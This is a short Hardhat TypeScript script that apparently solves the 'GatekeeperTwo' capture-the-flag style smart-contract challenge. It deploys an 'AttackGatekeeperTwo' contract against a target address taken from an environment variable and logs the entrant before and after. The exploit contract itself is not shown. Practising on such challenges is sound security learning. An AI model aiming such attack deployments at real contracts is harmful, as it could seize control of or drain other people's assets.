import {ethers} from "hardhat"
import dotenv from 'dotenv'
import type {GatekeeperTwo} from "../typechain-types";

dotenv.config()

async function main() {
    const isLocalTest = false
    let target: GatekeeperTwo
    if (isLocalTest) {
        target = await ethers.deployContract('GatekeeperTwo')
    } else {
        target = await ethers.getContractAt('GatekeeperTwo', process.env.TARGET_ADDRESS_15!)
    }

    console.log(`entrant before attack: ${await target.entrant()}`)
    await ethers.deployContract('AttackGatekeeperTwo', [target.target])
    console.log(`entrant after attack: ${await target.entrant()}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
